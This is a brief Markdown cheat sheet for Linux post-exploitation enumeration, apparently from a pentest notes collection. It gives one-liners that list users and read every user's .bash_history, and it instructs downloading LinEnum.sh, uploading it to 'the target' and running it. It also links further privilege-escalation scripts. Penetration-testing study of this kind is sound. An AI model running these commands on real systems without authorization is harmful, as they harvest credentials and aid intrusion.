# Post-Exploitation on Linux

## Data Haversting and Enumaration

### Common users

`awk -F: '{ if($3 >= 1000) print $1}' passwd >> users` 

### Reading bash_history files

Mapping users directories

`ls /home/ > users_home`

Reading files

`for user in $(cat home_users); do echo $user; cat /home/$user/.bash_history ; echo -e "=====\n" ;done`

### Using great scripts

LinEnu.sh

wget [LinEnum.sh](https://raw.githubusercontent.com/kitsun3sec/Pentest-Cheat-Sheets/master/CheatSheets/pos_xpl/LinEnum.sh)

#### Upload it to the target and run through terminal

```bash
> chmod +x LinEnum.sh
> ./LinEnum.sh -t
```

#### Done, now pay attention to the output and see if there is anything *interesting*


## OTHERS SCRIPTS

* [LinuxPrivChecker](https://www.securitysift.com/download/linuxprivchecker.py)
* [Linux Exploit Suggester](https://github.com/mzet-/linux-exploit-suggester)
* [High Coffee](https://highon.coffee/downloads/linux-local-enum.sh)